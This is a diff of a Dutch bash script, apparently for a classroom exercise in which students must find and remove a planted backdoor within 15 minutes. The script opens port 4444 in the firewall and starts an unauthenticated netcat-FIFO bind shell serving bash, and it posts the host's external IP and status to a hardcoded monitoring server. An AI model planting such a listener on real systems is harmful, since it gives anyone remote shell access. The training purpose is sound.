@@ -1,23 +1,31 @@
 #!/bin/bash
 
+### CONFIG ###
 SERVER_IP="148.100.79.193"  # <- Vervang dit door het IP van je Flask-server
-STUDENT_NAAM="$1"
-PORT=4444
-FIFO="/tmp/.fifo_$PORT"
+LISTENER_PORT=4444
 CALLBACK_PORT=5000
 
-# Stop oude processen
-pkill -f "nc -lvnp $PORT" 2>/dev/null
-pkill -f "bash < $FIFO" 2>/dev/null
-rm -f "$FIFO"
-mkfifo "$FIFO"
+# Check op parameter (voornaam)
+if [ -z "$1" ]; then
+  echo "Gebruik: sudo bash $0 <voornaam>"
+  exit 1
+fi
 
-# Start shell die communiceert via FIFO
-# Wordt gevoed door nc, output gaat terug via FIFO
-( while true; do bash < "$FIFO" > "$FIFO" 2>&1; done ) &
+STUDENT_NAAM="$1"
 
-# Start netcat listener die stdin naar FIFO stuurt
-( while true; do nc -lvnp "$PORT" < "$FIFO" > "$FIFO"; done ) &
+echo "[*] Setup gestart voor $STUDENT_NAAM..."
+
+# Poort openzetten met iptables
+iptables -C INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT 2>/dev/null || \
+iptables -I INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT
+
+# Start listener
+mkfifo /tmp/f
+(cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f) &
+# nohup nc -lvnp $LISTENER_PORT -e /bin/bash &>/dev/null &
+
+# Externe IP achterhalen
+EXTERNAL_IP=$(curl -s ifconfig.me)
 
 # Eerste registratie naar monitoringserver
 curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
@@ -36,20 +44,22 @@ echo -e "\n\033[1;31m
 Herstel dit voordat de 15 minuten om zijn!
 " | tee /tmp/hacked_banner.txt
 
-# Status reporter (elke 60 sec update naar server)
+# Start background status monitor
 status_reporter() {
   while true; do
-    if pgrep -f "nc -lvnp $PORT" > /dev/null; then
+    if pgrep -f "nc -lvnp $LISTENER_PORT" > /dev/null; then
       STATUS="vulnerable"
     else
       STATUS="secure"
     fi
 
     curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
-      -d "student=$STUDENT_NAAM&status=$STATUS" >/dev/null 2>&1
+      -d "student=$STUDENT_NAAM&status=$STATUS" &>/dev/null
 
     sleep 60
   done
 }
 
 status_reporter &
+
+echo "[✓] Setup compleet. Volg live op: http://$SERVER_IP:$CALLBACK_PORT"
